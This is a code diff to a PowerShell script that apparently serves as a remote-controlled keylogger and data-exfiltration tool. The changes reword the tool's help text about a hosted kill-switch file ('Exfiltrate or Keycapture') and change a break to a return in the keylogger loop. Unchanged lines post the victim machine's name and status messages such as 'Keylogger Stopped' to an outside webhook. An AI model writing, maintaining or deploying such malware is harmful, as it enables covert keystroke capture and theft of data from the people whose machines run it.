@@ -68,9 +68,8 @@ $msgsys = "``========================================================
 = Examples and Info -                                  =
 ========================================================
 = __To Exit Exiltrate or Keycapture__                  =
-= set `$GHURL to a text file on github which contains  =
-= the word 'False'. changing this word will exit       =
-= the script.                                          =
+= Edit your hosted file to contain 'kill'              =
+= this will exit the current function eg. 'keycapture' =  
 ========================================================``"
 $escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$escmsgsys"} | ConvertTo-Json
@@ -488,7 +487,7 @@ While ($true){
         $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"} | ConvertTo-Json
         Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
         $previouscmd = $response
-        break
+        return
         }
     }
     finally{
